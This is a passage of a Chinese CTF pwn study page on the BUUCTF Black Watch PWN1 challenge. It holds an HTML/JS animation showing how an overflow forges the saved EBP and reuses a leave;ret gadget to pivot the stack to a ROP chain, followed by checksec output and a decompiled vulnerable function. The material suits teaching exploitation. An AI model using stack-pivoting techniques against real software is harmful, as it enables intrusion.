+<details class="lake-collapse"><summary id="u230308ef"><span class="ne-text">可视化栈迁移动画</span></summary><figure class="highlight html" data-language="html" data-language-label="HTML"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>函数栈帧与栈迁移 (Stack Pivoting) 动画演示<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@import</span> url(<span class="string">&#x27;https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&amp;display=swap&#x27;</span>);</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> { <span class="attribute">font-family</span>: <span class="string">&#x27;Segoe UI&#x27;</span>, sans-serif; <span class="attribute">background-color</span>: <span class="number">#f8fafc</span>; }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.code-font</span> { <span class="attribute">font-family</span>: <span class="string">&#x27;Fira Code&#x27;</span>, monospace; }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.stack-cell</span> {</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>: all <span class="number">0.4s</span> <span class="built_in">cubic-bezier</span>(<span class="number">0.4</span>, <span class="number">0</span>, <span class="number">0.2</span>, <span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">48px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#e2e8f0</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.stack-cell</span><span class="selector-class">.active</span> { <span class="attribute">background-color</span>: <span class="number">#fef9c3</span>; <span class="attribute">border-color</span>: <span class="number">#eab308</span>; }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.stack-cell</span><span class="selector-class">.modified</span> { <span class="attribute">background-color</span>: <span class="number">#fee2e2</span>; <span class="attribute">border-color</span>: <span class="number">#ef4444</span>; } <span class="comment">/* 模拟篡改 */</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.stack-cell</span><span class="selector-class">.target</span> { <span class="attribute">background-color</span>: <span class="number">#dcfce7</span>; <span class="attribute">border-color</span>: <span class="number">#22c55e</span>; } <span class="comment">/* 迁移目标 */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pointer</span> {</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">right</span>: -<span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">0.7rem</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>: all <span class="number">0.5s</span> <span class="built_in">cubic-bezier</span>(<span class="number">0.34</span>, <span class="number">1.56</span>, <span class="number">0.64</span>, <span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pointer-esp</span> { <span class="attribute">background</span>: <span class="number">#ef4444</span>; <span class="attribute">color</span>: white; <span class="attribute">z-index</span>: <span class="number">30</span>; }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pointer-ebp</span> { <span class="attribute">background</span>: <span class="number">#3b82f6</span>; <span class="attribute">color</span>: white; <span class="attribute">z-index</span>: <span class="number">20</span>; }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.code-line</span> {</span></span><br><span class="line"><span class="language-css">        <span class="attribute">padding</span>: <span class="number">4px</span> <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left</span>: <span class="number">4px</span> solid transparent;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>: all <span class="number">0.2s</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">cursor</span>: default;</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.code-line</span><span class="selector-class">.active</span> {</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#1e293b</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#fbbf24</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-left-color</span>: <span class="number">#fbbf24</span>;</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.gadget-line</span> { <span class="attribute">color</span>: <span class="number">#f87171</span>; <span class="attribute">font-weight</span>: bold; } <span class="comment">/* 攻击指令高亮 */</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@keyframes</span> pulse-red {</span></span><br><span class="line"><span class="language-css">        <span class="number">0%</span>, <span class="number">100%</span> { <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>); }</span></span><br><span class="line"><span class="language-css">        <span class="number">50%</span> { <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.05</span>); <span class="attribute">border-color</span>: <span class="number">#ef4444</span>; }</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pivoting-alert</span> { <span class="attribute">animation</span>: pulse-red <span class="number">1s</span> infinite; }</span></span><br><span class="line"><span class="language-css">&amp;lt;/style&amp;gt;</span></span><br></pre></td></tr></table></figure>
+<p>&lt;&#x2F;head&gt;<br>&lt;body class&#x3D;&quot;p-4 bg-slate-100&quot;&gt;<br>    &lt;div class&#x3D;&quot;max-w-7xl mx-auto space-y-4&quot;&gt;<br>        &lt;!– Header –&gt;<br>        &lt;div class&#x3D;&quot;bg-slate-900 text-white p-6 rounded-xl shadow-lg&quot;&gt;<br>            &lt;div class&#x3D;&quot;flex justify-between items-center&quot;&gt;<br>                &lt;div&gt;<br>                    &lt;h1 class&#x3D;&quot;text-2xl font-bold italic tracking-tight&quot;&gt;Stack Frame &amp; Pivoting Visualizer&lt;&#x2F;h1&gt;<br>                    &lt;p class&#x3D;&quot;text-slate-400 text-sm&quot;&gt;深度解析：保护现场、恢复现场及利用 leave 指令触发栈迁移&lt;&#x2F;p&gt;<br>                &lt;&#x2F;div&gt;<br>                &lt;div class&#x3D;&quot;flex gap-2&quot;&gt;<br>                    &lt;button id&#x3D;&quot;mode-normal&quot; class&#x3D;&quot;px-4 py-2 rounded bg-blue-600 hover:bg-blue-500 text-sm font-bold transition&quot;&gt;正常函数调用&lt;&#x2F;button&gt;<br>                    &lt;button id&#x3D;&quot;mode-pivoting&quot; class&#x3D;&quot;px-4 py-2 rounded bg-red-600 hover:bg-red-500 text-sm font-bold transition&quot;&gt;栈迁移攻击演示&lt;&#x2F;button&gt;<br>                &lt;&#x2F;div&gt;<br>            &lt;&#x2F;div&gt;<br>        &lt;&#x2F;div&gt;</p>
+<pre><code>    &amp;lt;div class=&amp;quot;grid grid-cols-12 gap-4&amp;quot;&amp;gt;
+        &amp;lt;!-- Registers &amp;amp; Controls --&amp;gt;
+        &amp;lt;div class=&amp;quot;col-span-3 space-y-4&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;bg-white p-4 rounded-xl shadow-sm border border-slate-200&amp;quot;&amp;gt;
+                &amp;lt;h3 class=&amp;quot;text-xs font-bold text-slate-400 uppercase mb-3&amp;quot;&amp;gt;寄存器状态&amp;lt;/h3&amp;gt;
+                &amp;lt;div class=&amp;quot;space-y-2 code-font&amp;quot;&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between p-2 bg-slate-50 rounded&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-red-500 font-bold&amp;quot;&amp;gt;ESP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-esp&amp;quot;&amp;gt;0x100&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between p-2 bg-slate-50 rounded&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-blue-500 font-bold&amp;quot;&amp;gt;EBP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-ebp&amp;quot;&amp;gt;0x100&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between p-2 bg-slate-50 rounded&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-green-600 font-bold&amp;quot;&amp;gt;EIP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-eip&amp;quot;&amp;gt;0x401000&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                &amp;lt;/div&amp;gt;
+            &amp;lt;/div&amp;gt;
+
+            &amp;lt;div class=&amp;quot;bg-white p-4 rounded-xl shadow-sm border border-slate-200&amp;quot;&amp;gt;
+                &amp;lt;h3 class=&amp;quot;text-xs font-bold text-slate-400 uppercase mb-3&amp;quot;&amp;gt;控制面板&amp;lt;/h3&amp;gt;
+                &amp;lt;button id=&amp;quot;step-btn&amp;quot; class=&amp;quot;w-full bg-slate-800 text-white py-3 rounded-lg font-bold hover:bg-slate-700 transition mb-2&amp;quot;&amp;gt;执行下一步指令&amp;lt;/button&amp;gt;
+                &amp;lt;button id=&amp;quot;reset-btn&amp;quot; class=&amp;quot;w-full bg-slate-100 text-slate-600 py-2 rounded-lg text-sm hover:bg-slate-200 transition&amp;quot;&amp;gt;重置&amp;lt;/button&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+
+        &amp;lt;!-- Assembly Code --&amp;gt;
+        &amp;lt;div class=&amp;quot;col-span-4 bg-slate-900 rounded-xl shadow-inner overflow-hidden flex flex-col&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;p-3 bg-slate-800 text-slate-400 text-[10px] font-bold uppercase tracking-widest border-b border-slate-700&amp;quot;&amp;gt;反汇编指令流&amp;lt;/div&amp;gt;
+            &amp;lt;div id=&amp;quot;code-list&amp;quot; class=&amp;quot;flex-1 overflow-y-auto p-2 code-font text-xs text-slate-300&amp;quot;&amp;gt;
+                &amp;lt;!-- Lines injected here --&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+
+        &amp;lt;!-- Stack --&amp;gt;
+        &amp;lt;div class=&amp;quot;col-span-5 bg-white rounded-xl shadow-sm border border-slate-200 p-6 flex flex-col items-center&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;flex justify-between w-full mb-4 px-10&amp;quot;&amp;gt;
+                &amp;lt;span class=&amp;quot;text-[10px] text-slate-400 font-bold&amp;quot;&amp;gt;低地址 (0x00)&amp;lt;/span&amp;gt;
+                &amp;lt;h3 class=&amp;quot;text-sm font-bold text-slate-600&amp;quot;&amp;gt;栈空间内存布局&amp;lt;/h3&amp;gt;
+                &amp;lt;span class=&amp;quot;text-[10px] text-slate-400 font-bold&amp;quot;&amp;gt;高地址 (0xFF)&amp;lt;/span&amp;gt;
+            &amp;lt;/div&amp;gt;
+            
+            &amp;lt;div class=&amp;quot;relative w-full max-w-[240px]&amp;quot;&amp;gt;
+                &amp;lt;div id=&amp;quot;stack-view&amp;quot; class=&amp;quot;flex flex-col-reverse w-full border-x-2 border-b-2 border-slate-300&amp;quot;&amp;gt;
+                    &amp;lt;!-- Stack cells here --&amp;gt;
+                &amp;lt;/div&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;
+
+    &amp;lt;!-- Explanation Footer --&amp;gt;
+    &amp;lt;div id=&amp;quot;info-box&amp;quot; class=&amp;quot;bg-blue-50 border-l-4 border-blue-500 p-5 rounded-r-xl shadow-sm&amp;quot;&amp;gt;
+        &amp;lt;h4 id=&amp;quot;info-title&amp;quot; class=&amp;quot;font-bold text-blue-800 mb-1&amp;quot;&amp;gt;系统就绪&amp;lt;/h4&amp;gt;
+        &amp;lt;p id=&amp;quot;info-text&amp;quot; class=&amp;quot;text-blue-700 text-sm italic&amp;quot;&amp;gt;选择上方模式开始演示函数调用流程或栈迁移原理。&amp;lt;/p&amp;gt;
+    &amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+
+&amp;lt;script&amp;gt;
+    // Constants &amp;amp; State
+    const INITIAL_ESP = 0xC0;
+    const STACK_SIZE = 14;
+    let currentStep = -1;
+    let mode = &#39;normal&#39;; // &#39;normal&#39; or &#39;pivoting&#39;
+    let esp = INITIAL_ESP;
+    let ebp = INITIAL_ESP;
+    let eip = 0x401000;
+    let stackMap = {}; // addr -&amp;gt; { val, label, type }
+
+    const normalFlow = [
+        { op: &#39;PUSH 0x5&#39;, addr: 0x401000, desc: &#39;【参数入栈】准备函数调用环境。&#39;, action: &#39;push&#39;, val: &#39;0x5&#39;, label: &#39;arg 1&#39; },
+        { op: &#39;CALL foo&#39;, addr: 0x401005, desc: &#39;【保护现场 1】CALL 指令自动将返回地址（下一条指令地址 0x40100A）压入栈中。&#39;, action: &#39;call&#39;, val: &#39;0x40100A&#39;, label: &#39;Ret Addr&#39; },
+        { op: &#39;PUSH EBP&#39;, addr: 0x402000, desc: &#39;【保护现场 2】保存调用者的栈基址 (Old EBP)。&#39;, action: &#39;push&#39;, val: &#39;0xC0&#39;, label: &#39;Old EBP&#39; },
+        { op: &#39;MOV EBP, ESP&#39;, addr: 0x402001, desc: &#39;【保护现场 3】建立新栈帧：EBP 指向当前栈顶。&#39;, action: &#39;mov_ebp&#39; },
+        { op: &#39;SUB ESP, 8&#39;, addr: 0x402003, desc: &#39;分配局部变量空间。&#39;, action: &#39;sub_esp&#39;, val: 8 },
+        { op: &#39;MOV [EBP-4], 1&#39;, addr: 0x402006, desc: &#39;向局部变量写入数据。&#39;, action: &#39;write&#39;, offset: -4, val: &#39;0x1&#39;, label: &#39;local 1&#39; },
+        { op: &#39;LEAVE&#39;, addr: 0x402009, desc: &#39;【恢复现场 1-2】LEAVE 等效于 MOV ESP, EBP; POP EBP;。撤销局部变量空间并还原 Old EBP。&#39;, action: &#39;leave&#39; },
+        { op: &#39;RET&#39;, addr: 0x40200A, desc: &#39;【恢复现场 3】从栈顶弹出返回地址给 EIP，回到调用处。&#39;, action: &#39;ret&#39; }
+    ];
+
+    const pivotingFlow = [
+        { op: &#39;PUSH 0x405000&#39;, addr: 0x401000, desc: &#39;【伪造栈帧】攻击者在内存 0x405000 处构造了 ROP 链。&#39;, action: &#39;push&#39;, val: &#39;0x405000&#39;, label: &#39;Fake EBP&#39; },
+        { op: &#39;CALL vuln&#39;, addr: 0x401005, desc: &#39;调用漏洞函数。&#39;, action: &#39;call&#39;, val: &#39;0x40100A&#39;, label: &#39;Ret Addr&#39; },
+        { op: &#39;PUSH EBP&#39;, addr: 0x402000, desc: &#39;进入函数，正常保存 Old EBP。&#39;, action: &#39;push&#39;, val: &#39;0xC0&#39;, label: &#39;Old EBP&#39; },
+        { op: &#39;MOV EBP, ESP&#39;, addr: 0x402001, desc: &#39;建立栈帧。&#39;, action: &#39;mov_ebp&#39; },
+        { op: &#39;SUB ESP, 4&#39;, addr: 0x402003, desc: &#39;分配变量空间。&#39;, action: &#39;sub_esp&#39;, val: 4 },
+        { op: &#39;OVERFLOW [EBP]&#39;, addr: 0x402005, desc: &#39;【溢出攻击】篡改栈上的 Old EBP 为伪造地址 0x88，并覆盖返回地址为 leave; ret 指令地址。&#39;, action: &#39;overflow&#39;, targetEbp: 0x88, targetRet: &#39;0x40200A&#39; },
+        { op: &#39;LEAVE&#39;, addr: 0x402009, desc: &#39;【第一次 LEAVE】MOV ESP, EBP 让 ESP 指向被篡改的 EBP，POP EBP 让 EBP 变为伪造地址 0x88。&#39;, action: &#39;leave&#39; },
+        { op: &#39;RET (to leave;ret)&#39;, addr: 0x40200A, desc: &#39;【核心步】RET 返回到了另一个 leave 指令处。&#39;, action: &#39;ret_to_gadget&#39; },
+        { op: &#39;LEAVE (Gadget)&#39;, addr: 0x40200B, desc: &#39;【第二次 LEAVE】再次执行 MOV ESP, EBP，此时 EBP 是 0x88，ESP 瞬间被“迁移”到了远处的伪造栈区。&#39;, action: &#39;leave&#39; },
+        { op: &#39;RET (to SYSTEM)&#39;, addr: 0x40200C, desc: &#39;【迁移完成】ESP 现在正指向伪造栈上的恶意地址，RET 将直接执行攻击者的代码！&#39;, action: &#39;ret&#39; }
+    ];
+
+    let instructions = normalFlow;
+
+    function initUI() {
+        // Stack cells
+        const view = document.getElementById(&#39;stack-view&#39;);
+        view.innerHTML = &#39;&#39;;
+        for (let i = 0; i &amp;lt; STACK_SIZE; i++) {
+            const addr = INITIAL_ESP - (i * 4);
+            const div = document.createElement(&#39;div&#39;);
+            div.className = &#39;stack-cell&#39;;
+            div.id = `cell-${addr}`;
+            div.innerHTML = 
+                &amp;lt;span class=&amp;quot;absolute left-1 text-[8px] text-slate-300 font-mono&amp;quot;&amp;gt;0x${addr.toString(16).toUpperCase()}&amp;lt;/span&amp;gt;
+                &amp;lt;span class=&amp;quot;cell-val code-font font-bold text-xs&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;
+                &amp;lt;span class=&amp;quot;cell-label absolute -left-16 text-[9px] text-slate-500 font-bold opacity-0 transition-opacity&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;
+                &amp;lt;div id=&amp;quot;esp-${addr}&amp;quot; class=&amp;quot;pointer pointer-esp hidden&amp;quot;&amp;gt;ESP&amp;lt;/div&amp;gt;
+                &amp;lt;div id=&amp;quot;ebp-${addr}&amp;quot; class=&amp;quot;pointer pointer-ebp hidden&amp;quot;&amp;gt;EBP&amp;lt;/div&amp;gt;
+            ;
+            view.appendChild(div);
+        }
+
+        // Code list
+        const list = document.getElementById(&#39;code-list&#39;);
+        list.innerHTML = instructions.map((ins, i) =&amp;gt; 
+            &amp;lt;div id=&amp;quot;line-${i}&amp;quot; class=&amp;quot;code-line ${ins.addr === 0x40200B ? &#39;gadget-line&#39; : &#39;&#39;}&amp;quot;&amp;gt;
+                &amp;lt;span class=&amp;quot;opacity-30 mr-2&amp;quot;&amp;gt;0x${ins.addr.toString(16).toUpperCase()}&amp;lt;/span&amp;gt;
+                &amp;lt;span&amp;gt;${ins.op}&amp;lt;/span&amp;gt;
+            &amp;lt;/div&amp;gt;
+        ).join(&#39;&#39;);
+
+        updateRegisters();
+    }
+
+    function updateRegisters() {
+        document.getElementById(&#39;reg-esp&#39;).textContent = `0x${esp.toString(16).toUpperCase()}`;
+        document.getElementById(&#39;reg-ebp&#39;).textContent = `0x${ebp.toString(16).toUpperCase()}`;
+        document.getElementById(&#39;reg-eip&#39;).textContent = `0x${eip.toString(16).toUpperCase()}`;
+
+        document.querySelectorAll(&#39;.pointer&#39;).forEach(p =&amp;gt; p.classList.add(&#39;hidden&#39;));
+        const espPtr = document.getElementById(`esp-${esp}`);
+        const ebpPtr = document.getElementById(`ebp-${ebp}`);
+        if (espPtr) espPtr.classList.remove(&#39;hidden&#39;);
+        if (ebpPtr) {
+            ebpPtr.classList.remove(&#39;hidden&#39;);
+            ebpPtr.style.right = (esp === ebp) ? &#39;-150px&#39; : &#39;-100px&#39;;
+        }
+    }
+
+    function step() {
+        if (currentStep &amp;gt;= instructions.length - 1) return;
+        currentStep++;
+
+        const ins = instructions[currentStep];
+        eip = ins.addr;
+        
+        // Highlight code
+        document.querySelectorAll(&#39;.code-line&#39;).forEach(l =&amp;gt; l.classList.remove(&#39;active&#39;));
+        document.getElementById(`line-${currentStep}`).classList.add(&#39;active&#39;);
+
+        // Update info
+        document.getElementById(&#39;info-title&#39;).textContent = ins.op;
+        document.getElementById(&#39;info-text&#39;).textContent = ins.desc;
+        
+        // Logic
+        switch(ins.action) {
+            case &#39;push&#39;:
+                esp -= 4;
+                writeStack(esp, ins.val, ins.label);
+                break;
+            case &#39;call&#39;:
+                esp -= 4;
+                writeStack(esp, ins.val, ins.label);
+                break;
+            case &#39;mov_ebp&#39;:
+                ebp = esp;
+                break;
+            case &#39;sub_esp&#39;:
+                esp -= ins.val;
+                break;
+            case &#39;write&#39;:
+                writeStack(ebp + ins.offset, ins.val, ins.label);
+                break;
+            case &#39;leave&#39;:
+                // mov esp, ebp
+                const oldEsp = esp;
+                esp = ebp;
+                updateRegisters();
+                // pop ebp (after 400ms delay to show mov)
+                setTimeout(() =&amp;gt; {
+                    const cell = document.getElementById(`cell-${esp}`);
+                    const val = cell.querySelector(&#39;.cell-val&#39;).textContent;
+                    ebp = parseInt(val, 16) || INITIAL_ESP;
+                    clearStack(esp);
+                    esp += 4;
+                    updateRegisters();
+                }, 400);
+                break;
+            case &#39;ret&#39;:
+            case &#39;ret_to_gadget&#39;:
+                clearStack(esp);
+                esp += 4;
+                break;
+            case &#39;overflow&#39;:
+                // 篡改栈上的内容
+                writeStack(ebp, &#39;0x&#39; + ins.targetEbp.toString(16).toUpperCase(), &#39;FAKE EBP&#39;, true);
+                writeStack(ebp + 4, ins.targetRet, &#39;LEAVE;RET&#39;, true);
+                break;
+        }
+
+        updateRegisters();
+    }
+
+    function writeStack(addr, val, label, isAttack = false) {
+        const cell = document.getElementById(`cell-${addr}`);
+        if (!cell) return;
+        cell.classList.add(&#39;active&#39;);
+        if (isAttack) cell.classList.add(&#39;modified&#39;);
+        
+        const v = cell.querySelector(&#39;.cell-val&#39;);
+        v.textContent = val;
+        
+        const l = cell.querySelector(&#39;.cell-label&#39;);
+        l.textContent = label;
+        l.classList.remove(&#39;opacity-0&#39;);
+
+        setTimeout(() =&amp;gt; cell.classList.remove(&#39;active&#39;), 600);
+    }
+
+    function clearStack(addr) {
+        const cell = document.getElementById(`cell-${addr}`);
+        if (!cell) return;
+        cell.querySelector(&#39;.cell-val&#39;).textContent = &#39;&#39;;
+        cell.querySelector(&#39;.cell-label&#39;).classList.add(&#39;opacity-0&#39;);
+    }
+
+    document.getElementById(&#39;step-btn&#39;).addEventListener(&#39;click&#39;, step);
+    document.getElementById(&#39;reset-btn&#39;).addEventListener(&#39;click&#39;, () =&amp;gt; {
+        currentStep = -1;
+        esp = INITIAL_ESP;
+        ebp = INITIAL_ESP;
+        eip = 0x401000;
+        initUI();
+    });
+
+    document.getElementById(&#39;mode-normal&#39;).addEventListener(&#39;click&#39;, () =&amp;gt; {
+        mode = &#39;normal&#39;;
+        instructions = normalFlow;
+        document.getElementById(&#39;mode-normal&#39;).classList.add(&#39;bg-blue-600&#39;);
+        document.getElementById(&#39;mode-pivoting&#39;).classList.remove(&#39;bg-red-600&#39;);
+        document.getElementById(&#39;mode-pivoting&#39;).classList.add(&#39;bg-slate-600&#39;);
+        document.getElementById(&#39;reset-btn&#39;).click();
+    });
+
+    document.getElementById(&#39;mode-pivoting&#39;).addEventListener(&#39;click&#39;, () =&amp;gt; {
+        mode = &#39;pivoting&#39;;
+        instructions = pivotingFlow;
+        document.getElementById(&#39;mode-pivoting&#39;).classList.add(&#39;bg-red-600&#39;);
+        document.getElementById(&#39;mode-normal&#39;).classList.remove(&#39;bg-blue-600&#39;);
+        document.getElementById(&#39;mode-normal&#39;).classList.add(&#39;bg-slate-600&#39;);
+        document.getElementById(&#39;reset-btn&#39;).click();
+    });
+
+    window.onload = initUI;
+&amp;lt;/script&amp;gt;
+</code></pre>
+<p>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;</code></pre></details></p>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ldd ./pwn | grep  libc</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf0a2b000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/BUUCTF/[Black Watch 入群题]PWN1/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>只开启了nx，栈不可执行</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">size_t</span> n_1; <span class="comment">// eax</span></span><br><span class="line">    _BYTE buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">strlen</span>(m1);                               <span class="comment">// &quot;Hello good Ctfer!\nWhat is your name?&quot;</span></span><br><span class="line">    write(</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        m1,                                         <span class="comment">// &quot;Hello good Ctfer!\nWhat is your name?&quot;</span></span><br><span class="line">        n);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);</span><br><span class="line">    n_1 = <span class="built_in">strlen</span>(m2);                             <span class="comment">// &quot;What do you want to say?&quot;</span></span><br><span class="line">    write(</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        m2,                                         <span class="comment">// &quot;What do you want to say?&quot;</span></span><br><span class="line">        n_1);</span><br><span class="line">    <span 